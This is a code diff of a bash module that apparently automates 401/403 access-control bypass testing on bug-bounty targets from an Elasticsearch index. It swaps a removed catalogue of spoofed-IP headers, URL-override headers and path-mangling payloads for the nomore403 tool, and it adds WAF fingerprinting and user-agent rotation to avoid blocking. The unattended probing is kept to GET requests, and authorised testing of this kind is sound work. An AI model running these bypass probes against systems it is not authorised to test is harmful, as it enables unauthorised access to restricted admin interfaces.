@@ -1,64 +1,58 @@
 #!/usr/bin/env bash
 # =============================================================================
 # recon_bypass.sh — WAF-aware 401/403 access-control bypass testing
+#                    (ENGINE: nomore403 — github.com/devploit/nomore403)
 #
 # PIPELINE INTEGRATION
 #   The triage pipeline scores hosts; everything 401/403 with score>=6 in scope
 #   on paying programs becomes a bypass candidate. This module probes them with
-#   a WAF-tuned technique battery across tech-driven paths and writes confirmed
-#   bypass paths back into ES so they can be acted on (and re-found by other
-#   downstream modules: nuclei exposure, dast, params).
+#   nomore403 across tech-driven paths and writes confirmed bypass paths back
+#   into ES so they can be acted on (and re-found by other downstream modules:
+#   nuclei exposure, dast, params).
 #
-# WHAT MAKES THIS DIFFERENT FROM THE OLD VERSION
-#   - WAF fingerprinted up front (Cloudflare / Akamai / AWS WAF / ModSecurity /
-#     Incapsula / Sucuri / F5 / Barracuda / Tengine / generic). Technique order
-#     is reweighted per WAF so cheap-and-most-likely-effective probes run first
-#     and we short-circuit faster on protected sites.
-#   - Multi-path probing. We do not just bang on /. ES `tech` array drives which
-#     framework paths to test (Spring → /actuator/*, WordPress → /wp-admin/*,
-#     Jenkins → /script, ...). Plus a small set of generic admin paths. Each
-#     path tested independently; we store ALL confirmed bypass paths, not just
-#     the first.
-#   - Expanded technique set: 25+ probes (CF-Connecting-IP, X-ProxyUser-Ip,
-#     Client-IP, Host: localhost, Unicode-space prefix, HTTP/1.0 downgrade,
-#     chunked, method-case mangling, query/fragment/encoded path tricks).
-#   - IP-header combo escalation as a separate phase.
-#   - Confidence scoring (0-100), not binary. Body-size delta vs the baseline
-#     filters "200 returning the same WAF block page".
-#   - Per-path bypass details stored in ES as an array of objects, so reporting
-#     and re-verification stays accurate.
-#   - Discord embed shows the verified path + a copy-pasteable reproduction
-#     curl per the actual technique used.
+# WHY nomore403 IS THE ENGINE (replaced the hand-rolled curl battery)
+#   - Far larger, maintained payload set (headers/endpaths/midpaths/encoding/
+#     unicode/path-case/http-versions) vs the old ~25 inline probes.
+#   - Built-in AUTO-CALIBRATION: it samples the baseline a few times and only
+#     surfaces responses that DIFFER (status or content-length beyond tolerance),
+#     which kills the "200 returning the same WAF block page" class up front.
+#   - --random-agent rotates a realistic User-Agent per request (the old fixed
+#     "recon-bypass/1.0" UA was trivially blockable).
+#   - -l halts a target on the first 429 (anti-burn, never get the exit banned).
 #
-# DETECTION RULES
-#   1. Baseline = probe of the path with no extra headers, no redirect follow.
+# AUTONOMOUS-SAFETY HARD LINE (unattended pipeline = SAFE, unauth, NON-destructive)
+#   We run nomore403 with a GET-ONLY technique set — `verbs`/`verbs-case` (which
+#   send POST/PUT/DELETE/PATCH) are EXCLUDED. Every request is an unauthenticated
+#   GET with header/path mutations only. No method tampering, no state change.
+#   Operator-overseen MANUAL runs may add verbs; the daemon never does.
+#
+# DETECTION RULES (layered on top of nomore403 calibration)
+#   1. Baseline = our own no-header probe of the path (no redirect follow).
 #      If baseline is already 2xx, the path is unrestricted — skip it.
-#   2. Bypass candidate = response is 2xx after applying technique.
-#   3. Confidence (0-100) — caller's job to threshold:
-#         baseline 0 bytes:   size>200 → 60 ; >800 → 80 ; >2000 → 90
-#         baseline n bytes:   delta computed; same body or delta<60 → 0
-#                             delta>200 and final>500 → 70
-#                             delta>800                → 85
-#                             plus +10 if response body has tech-positive token
-#                                  (admin / dashboard / actuator / etc.)
-#      Anything <50 is ignored — almost always a 200 block-page or interstitial.
-#   4. We never follow redirects. "302 /login → 200" is not a bypass.
+#   2. Bypass candidate = nomore403 reports a 2xx for a technique on that path.
+#   3. SPA-shell filter: a 2xx whose body ~matches the app root "/" 2xx body
+#      (within 256 bytes) is the catch-all index.html, NOT a real bypass → drop.
+#   4. Confidence (0-100), body-size delta vs baseline (ported to jq):
+#         baseline 0 bytes:   size>=200 -> 60 ; >=800 -> 80 ; >=2000 -> 90
+#         baseline n bytes:   delta<60 -> 0 ; delta>=100 & size>=300 -> 55 ;
+#                             delta>=200 & size>=500 -> 70 ; delta>=800 & size>=500 -> 85
+#      Anything < BYPASS_MIN_CONF is ignored.
+#   5. We never follow redirects. "302 /login -> 200" is not a bypass.
 #
 # ES OUTPUT (per host)
 #   bypass_at                  timestamp (always — used for cooldown)
 #   bypass_checked_at          timestamp
 #   bypass_confirmed           true|false
 #   bypass_waf                 detected WAF tag (or "none")
-#   bypass_paths               array of {path, technique, confidence, code, size}
+#   bypass_paths               array of {path, technique, payload, confidence, code, size}
 #   bypass_technique           best technique (highest confidence)
 #   bypass_top_confidence      best confidence integer
 #   triage_signals             "bypass:<technique>" appended
 #   triage_score               +8 on confirm (and re-prioritised)
 #
 # RUNTIME
-#   Batch 30 hosts/cycle, 1h daemon interval. Per-host budget keeps us within
-#   that 1h window (cap ~25 paths × ~25 techniques each → guarded by global
-#   per-host timeout to keep cycle bounded). Cooldown 7 days unless re-promoted.
+#   Batch 30 hosts/cycle, 1h daemon interval. Per-host wall budget + per-path
+#   nomore403 timeout keep us inside the window; -l halts on rate-limit.
 #
 # CONSTRAINTS
 #   ES auth: --netrc-file ~/.recon_es_netrc — never -u.
@@ -85,17 +79,43 @@ INDEX_NAME="${INDEX_NAME:-recon_alive}"
 BYPASS_BATCH="${BYPASS_BATCH:-30}"
 BYPASS_MIN_SCORE="${BYPASS_MIN_SCORE:-6}"
 BYPASS_COOLDOWN="${BYPASS_COOLDOWN:-604800}"   # 7 days
-BYPASS_TIMEOUT="${BYPASS_TIMEOUT:-8}"          # per probe
-BYPASS_HOST_BUDGET="${BYPASS_HOST_BUDGET:-180}" # max wall-seconds per host
+BYPASS_TIMEOUT="${BYPASS_TIMEOUT:-8}"          # per probe (seconds) — also nomore403 --timeout
+BYPASS_HOST_BUDGET="${BYPASS_HOST_BUDGET:-240}" # max wall-seconds per host
 BYPASS_MIN_CONF="${BYPASS_MIN_CONF:-50}"       # confidence threshold to record
+BYPASS_MAX_PATHS="${BYPASS_MAX_PATHS:-8}"      # cap paths/host (nomore403 is heavy per path)
 BYPASS_SCORE_BONUS=8
+
+# ── nomore403 engine config ──────────────────────────────────────────────────
+NOMORE403_DIR="${NOMORE403_DIR:-$HOME/Tools/nomore403}"
+NOMORE403_BIN="${NOMORE403_BIN:-$NOMORE403_DIR/nomore403}"
+NOMORE403_PAYLOADS="${NOMORE403_PAYLOADS:-$NOMORE403_DIR/payloads}"
+# GET-ONLY technique set (no verbs/verbs-case → no POST/PUT/DELETE; unattended-safe).
+NOMORE403_TECHNIQUES="${NOMORE403_TECHNIQUES:-headers,endpaths,midpaths,double-encoding,unicode,http-versions,path-case}"
+NOMORE403_DELAY="${NOMORE403_DELAY:-100}"      # ms between requests (anti-burn)
+NOMORE403_CONC="${NOMORE403_CONC:-10}"         # max goroutines
+NOMORE403_PATH_TIMEOUT="${NOMORE403_PATH_TIMEOUT:-60}" # wall-seconds per path run
+
+if [[ ! -x "$NOMORE403_BIN" ]]; then
+  warn "nomore403 binary not found/executable at $NOMORE403_BIN — set NOMORE403_BIN. Skipping cycle."
+  exit 0
+fi
 
 LOCK_FILE="$STATE_DIR/bypass.lock"
 mkdir -p "$STATE_DIR"
+NM_TMPDIR="$(mktemp -d "${TMPDIR:-/tmp}/bypass.XXXXXX")"
+cleanup() { rm -rf "$NM_TMPDIR" 2>/dev/null || true; }
+trap cleanup EXIT
 exec 9>"$LOCK_FILE"
 flock -n 9 || { warn "bypass already running"; exit 0; }
 
 es_curl() { curl -sS -m30 "${ES_AUTH[@]}" "$@"; }
+
+# Random realistic UA for our own baseline / WAF-fingerprint curls (the random
+# rotation for the bypass probes themselves is nomore403 --random-agent).
+_rand_ua() {
+  shuf -n1 "$NOMORE403_PAYLOADS/useragents" 2>/dev/null \
+    || printf 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36'
+}
 
 cooldown_cutoff="$(date -u -d "-${BYPASS_COOLDOWN} seconds" '+%Y-%m-%dT%H:%M:%SZ' 2>/dev/null || \
   python3 -c "
@@ -138,7 +158,7 @@ resp="$(es_curl -H 'Content-Type: application/json' \
   -X POST "$ES_URL/$INDEX_NAME/_search" -d "$query" 2>/dev/null)"
 
 total="$(printf '%s' "$resp" | jq -r '.hits.total.value // 0')"
-log "401/403 targets (pays, score>=${BYPASS_MIN_SCORE}, not tested in 7d): $total — testing up to $BYPASS_BATCH"
+log "401/403 targets (pays, score>=${BYPASS_MIN_SCORE}, not tested in 7d): $total — testing up to $BYPASS_BATCH (engine=nomore403, GET-only)"
 [[ "$total" -eq 0 ]] && { log "Nothing to test this cycle"; exit 0; }
 
 now_iso="$(date -u '+%Y-%m-%dT%H:%M:%SZ')"
@@ -147,16 +167,14 @@ host_count=0
 
 # ── WAF fingerprint ──────────────────────────────────────────────────────────
 # Probes once with HEAD, then GET (some WAFs hide headers on HEAD). Returns a
-# single tag we use to reorder the technique queue.
+# single tag stored in ES as bypass_waf. (nomore403 calibrates per target but
+# does not name the WAF — this keeps that intel.)
 _fingerprint_waf() {
-  local u="$1" headers tag="none"
-  headers="$(curl -sS -m"$BYPASS_TIMEOUT" -I --no-location \
-    -A 'Mozilla/5.0 (compatible; recon-bypass/1.0)' \
+  local u="$1" headers tag="none" ua; ua="$(_rand_ua)"
+  headers="$(curl -sS -m"$BYPASS_TIMEOUT" -I --no-location -A "$ua" \
     "$u" 2>/dev/null | tr -d '\r' | tr '[:upper:]' '[:lower:]')"
-  # If HEAD blocked or empty, try GET headers
   if [[ -z "$headers" || "$headers" != *":"* ]]; then
-    headers="$(curl -sS -m"$BYPASS_TIMEOUT" -D - -o /dev/null --no-location \
-      -A 'Mozilla/5.0 (compatible; recon-bypass/1.0)' \
+    headers="$(curl -sS -m"$BYPASS_TIMEOUT" -D - -o /dev/null --no-location -A "$ua" \
       "$u" 2>/dev/null | tr -d '\r' | tr '[:upper:]' '[:lower:]')"
   fi
   case "$headers" in
@@ -178,7 +196,6 @@ _fingerprint_waf() {
 
 # ── Tech-driven path expansion ───────────────────────────────────────────────
 # Given the ES `tech` array, emit additional paths to probe alongside /.
-# Output: newline-separated relative paths (always include a leading slash).
 _tech_paths() {
   local tech_csv="$1"   # comma-separated lowercase
   local out=""
@@ -244,7 +261,7 @@ _tech_paths() {
   esac
   case ",$tech_csv," in
     *",swagger,"*|*",openapi,"*)
-      out+=$'/swagger\n/swagger-ui\n/api-docs\n/v2/api-docs\n' ;;
+      out+=$'/swagger\n/swagger-ui\n/api-docs\n/v2/api-docs\n/swagger/v1/swagger.json\n' ;;
   esac
   printf '%s' "$out"
 }
@@ -261,201 +278,60 @@ _generic_paths='/admin
 /api/v1
 /api/v2'
 
-# ── Probe primitive ──────────────────────────────────────────────────────────
+# ── Baseline probe primitive ─────────────────────────────────────────────────
 # Returns "CODE<TAB>SIZE" — no redirect follow, hard timeout, errors → "0\t0".
 _probe() {
   local test_url="$1"; shift
   curl -sS -m"$BYPASS_TIMEOUT" \
     --no-location \
+    -A "$BYPASS_UA" \
     -o /dev/null \
     -w '%{http_code}\t%{size_download}' \
     "$@" "$test_url" 2>/dev/null \
     || printf '0\t0'
 }
 
-# Returns confidence integer (0-100). Args: <code> <size> <baseline_size> [shell_size]
-# shell_size = body size of the app's root "/" 2xx response. A "bypass" 200 whose
-# body size ~matches that shell is the SPA/app catch-all (index.html served for any
-# unmatched path), NOT a real bypass — it scores 0. (Fixes the tfb.t-mobile.com FP:
-# /<en-space>api returned the Angular index.html, identical to /, while real /api=401.)
-_confidence() {
-  local code="$1" size="$2" b_size="$3" shell_size="${4:-0}"
-  [[ "$code" =~ ^2 ]] || { printf '0'; return; }
-  if [[ "$shell_size" -gt 0 ]]; then
-    local sdiff=$(( size > shell_size ? size - shell_size : shell_size - size ))
-    [[ "$sdiff" -le 256 ]] && { printf '0'; return; }
-  fi
-  local diff
-  if [[ "$b_size" -eq 0 ]]; then
-    if   [[ "$size" -ge 2000 ]]; then printf '90'
-    elif [[ "$size" -ge 800  ]]; then printf '80'
-    elif [[ "$size" -ge 200  ]]; then printf '60'
-    else                              printf '0'
-    fi
-    return
-  fi
-  diff=$(( size > b_size ? size - b_size : b_size - size ))
-  if [[ "$diff" -lt 60 ]]; then printf '0'; return; fi
-  if   [[ "$diff" -ge 800 && "$size" -ge 500 ]]; then printf '85'
-  elif [[ "$diff" -ge 200 && "$size" -ge 500 ]]; then printf '70'
-  elif [[ "$diff" -ge 100 && "$size" -ge 300 ]]; then printf '55'
-  else                                                printf '0'
-  fi
+# ── nomore403 per-path runner ────────────────────────────────────────────────
+# Args: base_url, path, shell_size, baseline_size
+# Emits one compact JSON record per CONFIRMED bypass (>= BYPASS_MIN_CONF) to
+# stdout: {path, technique, payload, code, size, confidence}.
+_nm_probe_path() {
+  local base="$1" path="$2" shell="$3" b_size="$4"
+  local target="${base%/}${path}"
+  local out; out="$(mktemp "$NM_TMPDIR/nm.XXXXXX.json")"
+  timeout "$NOMORE403_PATH_TIMEOUT" "$NOMORE403_BIN" \
+    -u "$target" --json -o "$out" --no-banner --random-agent -l \
+    -d "$NOMORE403_DELAY" -m "$NOMORE403_CONC" \
+    -k "$NOMORE403_TECHNIQUES" -f "$NOMORE403_PAYLOADS" \
+    --timeout "$(( BYPASS_TIMEOUT * 1000 ))" \
+    >/dev/null 2>&1 || true
+  [[ -s "$out" ]] || { rm -f "$out"; return; }
+  # Score each 2xx result vs baseline + app shell, in jq (ports _confidence).
+  jq -c \
+    --arg path "$path" \
+    --argjson bsize "$b_size" \
+    --argjson shell "$shell" \
+    --argjson minconf "$BYPASS_MIN_CONF" '
+    (.[]?) | select(.status_code >= 200 and .status_code < 300)
+    | .content_length as $sz
+    | ((if ($sz - $shell) < 0 then ($shell - $sz) else ($sz - $shell) end)) as $sd
+    | select($shell <= 0 or $sd > 256)
+    | ((if ($sz - $bsize) < 0 then ($bsize - $sz) else ($sz - $bsize) end)) as $d
+    | (if $bsize == 0 then
+         (if $sz >= 2000 then 90 elif $sz >= 800 then 80 elif $sz >= 200 then 60 else 0 end)
+       else
+         (if $d < 60 then 0
+          elif ($d >= 800 and $sz >= 500) then 85
+          elif ($d >= 200 and $sz >= 500) then 70
+          elif ($d >= 100 and $sz >= 300) then 55
+          else 0 end)
+       end) as $conf
+    | select($conf >= $minconf)
+    | {path:$path, technique:.technique, payload:.payload,
+       code:.status_code, size:$sz, confidence:$conf}
+  ' "$out" 2>/dev/null
+  rm -f "$out"
 }
-
-# A small body-content boost (+10) when the bypass response contains tokens
-# that distinguish a real authenticated UI from a generic block page. Probe
-# is best-effort — done only if base scoring already cleared the threshold.
-_body_boost() {
-  local test_url="$1"; shift
-  local body
-  body="$(curl -sS -m"$BYPASS_TIMEOUT" --no-location \
-    -o - -w '' "$@" "$test_url" 2>/dev/null | tr '[:upper:]' '[:lower:]' | head -c 8192 || true)"
-  [[ -z "$body" ]] && { printf '0'; return; }
-  case "$body" in
-    *"dashboard"*|*"admin panel"*|*"actuator"*|*"swagger-ui"*|\
-    *"graphiql"*|*"prometheus"*|*"jenkins"*|*"gitlab"*|\
-    *"phpmyadmin"*|*"server status"*|*"kibana"*) printf '10' ;;
-    *) printf '0' ;;
-  esac
-}
-
-# ── Technique definitions ────────────────────────────────────────────────────
-# Each "technique" is a name plus a curl flag array. Generated dynamically so
-# the WAF tag can reorder them. Output format per line:
-#   name<TAB>flag1<US>flag2<US>flag3...
-# (Using ASCII Unit Separator 0x1F as inner delimiter so curl values can carry
-# spaces without quoting hell.)
-US=$'\x1f'
-
-_emit() { printf '%s\t%s\n' "$1" "$2"; }
-
-# Build the full technique catalog (path-independent, single-shot probes).
-_techniques_for_waf() {
-  local waf="$1"
-
-  # IP-header singletons, ordered by general efficacy.
-  local ip_singletons=(
-    "xff-127.0.0.1${US}X-Forwarded-For: 127.0.0.1"
-    "x-real-ip${US}X-Real-IP: 127.0.0.1"
-    "true-client-ip${US}True-Client-IP: 127.0.0.1"
-    "cf-connecting-ip${US}CF-Connecting-IP: 127.0.0.1"
-    "x-originating-ip${US}X-Originating-IP: 127.0.0.1"
-    "x-remote-ip${US}X-Remote-IP: 127.0.0.1"
-    "x-remote-addr${US}X-Remote-Addr: 127.0.0.1"
-    "x-client-ip${US}X-Client-IP: 127.0.0.1"
-    "x-custom-ip${US}X-Custom-IP-Authorization: 127.0.0.1"
-    "x-proxyuser-ip${US}X-ProxyUser-Ip: 127.0.0.1"
-    "client-ip${US}Client-IP: 127.0.0.1"
-    "x-forwarded-by${US}X-Forwarded-By: 127.0.0.1"
-    "forwarded-rfc7239${US}Forwarded: for=127.0.0.1;proto=http"
-    "via${US}Via: 1.1 127.0.0.1"
-    "x-host-localhost${US}X-Host: localhost"
-    "x-forwarded-host-localhost${US}X-Forwarded-Host: localhost"
-  )
-
-  # URL-override headers
-  local url_override=(
-    "x-original-url${US}X-Original-URL: /"
-    "x-rewrite-url${US}X-Rewrite-URL: /"
-    "x-override-url${US}X-Override-URL: /"
-  )
-
-  # Method-override (single-flag is just a header; multi-flag combos handled separately)
-  local method_singletons=(
-    "method-override-get${US}X-HTTP-Method-Override: GET"
-    "method-override-options${US}X-HTTP-Method-Override: OPTIONS"
-    "method-override-alt${US}X-Method-Override: GET"
-  )
-
-  # Per-WAF ordering hints. The default is "all in catalog order".
-  case "$waf" in
-    cloudflare)
-      # CF-Connecting-IP front-runs; chunked rarely helps; method overrides middling.
-      printf '%s\n' \
-        "cf-connecting-ip${US}CF-Connecting-IP: 127.0.0.1" \
-        "true-client-ip${US}True-Client-IP: 127.0.0.1" \
-        "xff-127.0.0.1${US}X-Forwarded-For: 127.0.0.1" \
-        "x-real-ip${US}X-Real-IP: 127.0.0.1" \
-        "x-host-localhost${US}X-Host: localhost"
-      ;;
-    akamai)
-      printf '%s\n' \
-        "true-client-ip${US}True-Client-IP: 127.0.0.1" \
-        "xff-127.0.0.1${US}X-Forwarded-For: 127.0.0.1" \
-        "x-real-ip${US}X-Real-IP: 127.0.0.1"
-      ;;
-    aws-waf)
-      printf '%s\n' \
-        "xff-127.0.0.1${US}X-Forwarded-For: 127.0.0.1" \
-        "x-real-ip${US}X-Real-IP: 127.0.0.1" \
-        "x-forwarded-host-localhost${US}X-Forwarded-Host: localhost"
-      ;;
-    f5-bigip|imperva|incapsula|distil|barracuda|sucuri)
-      printf '%s\n' \
-        "xff-127.0.0.1${US}X-Forwarded-For: 127.0.0.1" \
-        "x-originating-ip${US}X-Originating-IP: 127.0.0.1" \
-        "x-client-ip${US}X-Client-IP: 127.0.0.1"
-      ;;
-    *) : ;;
-  esac
-
-  # Always emit the full catalog after the WAF-priority head (dedupe handled
-  # by short-circuit on first hit per path — order matters for early exit).
-  printf '%s\n' "${ip_singletons[@]}"
-  printf '%s\n' "${url_override[@]}"
-  printf '%s\n' "${method_singletons[@]}"
-  # IP-header combo (one shot — three headers at once)
-  printf '%s\n' "ip-header-combo${US}X-Forwarded-For: 127.0.0.1${US}X-Real-IP: 127.0.0.1${US}X-Custom-IP-Authorization: 127.0.0.1${US}CF-Connecting-IP: 127.0.0.1"
-}
-
-# ── Path mangling variants ───────────────────────────────────────────────────
-# Given a base URL and a path, emit alternate request URLs to try with the
-# baseline headers (no extra header tricks — purely path-level evasion).
-# Output: technique<TAB>full_url
-_path_variants() {
-  local base="$1" path="$2"
-  local trimmed="${path%/}"
-  [[ -z "$trimmed" ]] && trimmed="/"
-  # Strip duplicate slashes between base and path
-  local b="${base%/}"
-  printf '%s\t%s\n' "double-slash"           "${b}/${trimmed}/"
-  printf '%s\t%s\n' "double-slash-prefix"    "${b}//${trimmed#/}"
-  printf '%s\t%s\n' "path-dot"               "${b}${trimmed}/."
-  printf '%s\t%s\n' "path-dot-slash"         "${b}${trimmed}/./"
-  printf '%s\t%s\n' "trailing-semicolon"     "${b}${trimmed};/"
-  printf '%s\t%s\n' "traversal-semicolon"    "${b}${trimmed}/..;/"
-  printf '%s\t%s\n' "encoded-slash"          "${b}${trimmed}%2f"
-  printf '%s\t%s\n' "encoded-dot"            "${b}${trimmed}%2e"
-  printf '%s\t%s\n' "encoded-space"          "${b}${trimmed}%20"
-  printf '%s\t%s\n' "encoded-cr"             "${b}${trimmed}%0d"
-  printf '%s\t%s\n' "encoded-lf"             "${b}${trimmed}%0a"
-  printf '%s\t%s\n' "unicode-space-prefix"   "${b}/%e2%80%82${trimmed#/}"
-  printf '%s\t%s\n' "query-bypass"           "${b}${trimmed}?bypass=1"
-  printf '%s\t%s\n' "fragment-trick"         "${b}${trimmed}#"
-  printf '%s\t%s\n' "trailing-hash-percent"  "${b}${trimmed}%23"
-}
-
-# Build the final argv array to pass to curl for a given technique line.
-# Sets ${TECH_NAME} and populates ${TECH_ARGS[@]}.
-_unpack_technique() {
-  local line="$1"
-  TECH_NAME="${line%%$'\t'*}"
-  local rest="${line#*$'\t'}"
-  TECH_ARGS=()
-  local IFSb="$IFS"
-  IFS="$US"
-  local part
-  # shellcheck disable=SC2086
-  for part in $rest; do
-    [[ -z "$part" ]] && continue
-    TECH_ARGS+=(-H "$part")
-  done
-  IFS="$IFSb"
-}
-
-# Dedupe the technique list — WAF priority head + catalog can repeat lines.
-_techniques_for_waf_dedup() { _techniques_for_waf "$1" | awk '!seen[$0]++'; }
 
 # ── Per-host bypass loop ─────────────────────────────────────────────────────
 while IFS= read -r hit; do
@@ -471,159 +347,61 @@ while IFS= read -r hit; do
   tech_csv="$(printf '%s' "$hit" | jq -r '(._source.tech // []) | map(ascii_downcase) | join(",")')"
   webserver="$(printf '%s' "$hit"| jq -r '._source.webserver // ""')"
 
-  # Strip any path from the URL to derive base
   base_url="$(printf '%s' "$url" | sed -E 's@^(https?://[^/]+).*@\1@')"
+
+  # Per-host random UA for our own baseline/fingerprint curls.
+  BYPASS_UA="$(_rand_ua)"
 
   log "Host $host_count/$BYPASS_BATCH: $host (orig=$orig_status, score=$score, $program, tech=${tech_csv:-none})"
 
-  # Fingerprint WAF on the root URL once.
   waf="$(_fingerprint_waf "$base_url")"
   log "  waf=$waf  webserver=${webserver:-?}"
 
-  # Build path list: tech-driven + generic, root always last so it does not
-  # eat the budget on hosts where the interesting surface is deeper.
+  # Build path list: tech-driven + generic, root always last; cap to BYPASS_MAX_PATHS.
   tech_paths="$(_tech_paths "$tech_csv")"
-  mapfile -t all_paths < <(printf '%s\n%s\n/\n' "$tech_paths" "$_generic_paths" | awk 'NF && !seen[$0]++')
+  mapfile -t all_paths < <(printf '%s\n%s\n/\n' "$tech_paths" "$_generic_paths" \
+    | awk 'NF && !seen[$0]++' | head -n "$BYPASS_MAX_PATHS")
 
-  # Capture the app's root-shell size: a 2xx body served at "/" is the SPA/app
-  # catch-all; any "bypass" 200 of ~the same size is that shell, not a real bypass.
+  # App root-shell size: a 2xx body at "/" is the SPA/app catch-all; any "bypass"
+  # 200 of ~the same size is that shell, not a real bypass.
   shell_size=0
   root_probe="$(_probe "${base_url%/}/")"
   [[ "${root_probe%%$'\t'*}" =~ ^2 ]] && shell_size="${root_probe##*$'\t'}"
 
-  # Confirmed bypass records (JSON objects) for this host.
   bypass_records="[]"
   best_tech=""
   best_conf=0
-
-  # Per-host wall-clock budget
   budget_exceeded=0
+
   for path in "${all_paths[@]}"; do
     [[ "$budget_exceeded" -eq 1 ]] && break
-    local_url="${base_url%/}${path}"
+    now_elapsed=$(( $(date +%s) - host_start ))
+    [[ "$now_elapsed" -gt "$BYPASS_HOST_BUDGET" ]] && { budget_exceeded=1; break; }
 
-    # Baseline probe
+    local_url="${base_url%/}${path}"
     baseline="$(_probe "$local_url")"
     b_code="${baseline%%$'\t'*}"
     b_size="${baseline##*$'\t'}"
 
-    # If the path is already 2xx unrestricted, do not waste budget bypassing it
-    if [[ "$b_code" =~ ^2 ]]; then
-      continue
-    fi
-    # If path returns network error (000) or 5xx, skip — not a meaningful target
-    if [[ "$b_code" == "0" || "$b_code" =~ ^5 ]]; then
-      continue
-    fi
-    # We only care about 401/403/451/418 style restricted paths
+    # Already-open / network-error / 5xx → not a meaningful bypass target.
+    [[ "$b_code" =~ ^2 ]] && continue
+    [[ "$b_code" == "0" || "$b_code" =~ ^5 ]] && continue
     case "$b_code" in
       401|403|451|418|400|405) : ;;
       *) continue ;;
     esac
 
-    # Header-based techniques
-    found_for_path=0
-    while IFS= read -r tline; do
-      [[ -z "$tline" ]] && continue
-      [[ "$found_for_path" -eq 1 ]] && break
-      now_elapsed=$(( $(date +%s) - host_start ))
-      if [[ "$now_elapsed" -gt "$BYPASS_HOST_BUDGET" ]]; then
-        budget_exceeded=1
-        break
-      fi
-      _unpack_technique "$tline"
-      result="$(_probe "$local_url" "${TECH_ARGS[@]}")"
-      r_code="${result%%$'\t'*}"
-      r_size="${result##*$'\t'}"
-      conf="$(_confidence "$r_code" "$r_size" "$b_size" "$shell_size")"
-      [[ "$conf" -lt "$BYPASS_MIN_CONF" ]] && continue
-      # Body-boost confirmation (only on plausible hits)
-      boost="$(_body_boost "$local_url" "${TECH_ARGS[@]}")"
-      conf=$(( conf + boost ))
-      [[ "$conf" -gt 100 ]] && conf=100
-      log "  HIT path=$path technique=$TECH_NAME code=$r_code size=$r_size conf=$conf"
-      rec="$(jq -nc \
-        --arg path "$path" --arg tech "$TECH_NAME" \
-        --arg code "$r_code" --arg size "$r_size" \
-        --argjson conf "$conf" \
-        '{path:$path, technique:$tech, code:($code|tonumber), size:($size|tonumber), confidence:$conf}')"
+    # Run nomore403 (GET-only techniques) and collect scored bypass records.
+    while IFS= read -r rec; do
+      [[ -z "$rec" ]] && continue
       bypass_records="$(jq -c --argjson r "$rec" '. + [$r]' <<< "$bypass_records")"
-      if [[ "$conf" -gt "$best_conf" ]]; then
-        best_conf="$conf"; best_tech="$TECH_NAME"
+      rconf="$(jq -r '.confidence' <<< "$rec")"
+      rtech="$(jq -r '.technique' <<< "$rec")"
+      log "  HIT path=$path technique=$rtech conf=$rconf"
+      if [[ "$rconf" -gt "$best_conf" ]]; then
+        best_conf="$rconf"; best_tech="$rtech"
       fi
-      found_for_path=1
-    done < <(_techniques_for_waf_dedup "$waf")
-
-    # Method tricks (separate from header techniques — need -X)
-    if [[ "$found_for_path" -eq 0 ]]; then
-      for m in TRACE OPTIONS POST PUT PATCH; do
-        now_elapsed=$(( $(date +%s) - host_start ))
-        [[ "$now_elapsed" -gt "$BYPASS_HOST_BUDGET" ]] && { budget_exceeded=1; break; }
-        result="$(_probe "$local_url" -X "$m")"
-        r_code="${result%%$'\t'*}"; r_size="${result##*$'\t'}"
-        conf="$(_confidence "$r_code" "$r_size" "$b_size" "$shell_size")"
-        [[ "$conf" -lt "$BYPASS_MIN_CONF" ]] && continue
-        log "  HIT path=$path technique=method-$m code=$r_code size=$r_size conf=$conf"
-        rec="$(jq -nc \
-          --arg path "$path" --arg tech "method-${m,,}" \
-          --arg code "$r_code" --arg size "$r_size" \
-          --argjson conf "$conf" \
-          '{path:$path, technique:$tech, code:($code|tonumber), size:($size|tonumber), confidence:$conf}')"
-        bypass_records="$(jq -c --argjson r "$rec" '. + [$r]' <<< "$bypass_records")"
-        if [[ "$conf" -gt "$best_conf" ]]; then
-          best_conf="$conf"; best_tech="method-${m,,}"
-        fi
-        found_for_path=1
-        break
-      done
-    fi
-
-    # HTTP/1.0 downgrade — a single shot
-    if [[ "$found_for_path" -eq 0 ]]; then
-      now_elapsed=$(( $(date +%s) - host_start ))
-      if [[ "$now_elapsed" -le "$BYPASS_HOST_BUDGET" ]]; then
-        result="$(_probe "$local_url" --http1.0)"
-        r_code="${result%%$'\t'*}"; r_size="${result##*$'\t'}"
-        conf="$(_confidence "$r_code" "$r_size" "$b_size" "$shell_size")"
-        if [[ "$conf" -ge "$BYPASS_MIN_CONF" ]]; then
-          log "  HIT path=$path technique=http1.0 code=$r_code size=$r_size conf=$conf"
-          rec="$(jq -nc \
-            --arg path "$path" --arg tech "http1.0-downgrade" \
-            --arg code "$r_code" --arg size "$r_size" \
-            --argjson conf "$conf" \
-            '{path:$path, technique:$tech, code:($code|tonumber), size:($size|tonumber), confidence:$conf}')"
-          bypass_records="$(jq -c --argjson r "$rec" '. + [$r]' <<< "$bypass_records")"
-          if [[ "$conf" -gt "$best_conf" ]]; then
-            best_conf="$conf"; best_tech="http1.0-downgrade"
-          fi
-          found_for_path=1
-        fi
-      fi
-    fi
-
-    # Path mangling — each variant tried with baseline headers only
-    if [[ "$found_for_path" -eq 0 ]]; then
-      while IFS=$'\t' read -r vname vurl; do
-        [[ -z "$vname" ]] && continue
-        now_elapsed=$(( $(date +%s) - host_start ))
-        [[ "$now_elapsed" -gt "$BYPASS_HOST_BUDGET" ]] && { budget_exceeded=1; break; }
-        result="$(_probe "$vurl")"
-        r_code="${result%%$'\t'*}"; r_size="${result##*$'\t'}"
-        conf="$(_confidence "$r_code" "$r_size" "$b_size" "$shell_size")"
-        [[ "$conf" -lt "$BYPASS_MIN_CONF" ]] && continue
-        log "  HIT path=$path technique=$vname code=$r_code size=$r_size conf=$conf"
-        rec="$(jq -nc \
-          --arg path "$path" --arg tech "$vname" \
-          --arg code "$r_code" --arg size "$r_size" \
-          --argjson conf "$conf" \
-          '{path:$path, technique:$tech, code:($code|tonumber), size:($size|tonumber), confidence:$conf}')"
-        bypass_records="$(jq -c --argjson r "$rec" '. + [$r]' <<< "$bypass_records")"
-        if [[ "$conf" -gt "$best_conf" ]]; then
-          best_conf="$conf"; best_tech="$vname"
-        fi
-        break
-      done < <(_path_variants "$base_url" "$path")
-    fi
+    done < <(_nm_probe_path "$base_url" "$path" "$shell_size" "$b_size")
   done
 
   paths_hit="$(jq 'length' <<< "$bypass_records")"
@@ -671,40 +449,20 @@ while IFS= read -r hit; do
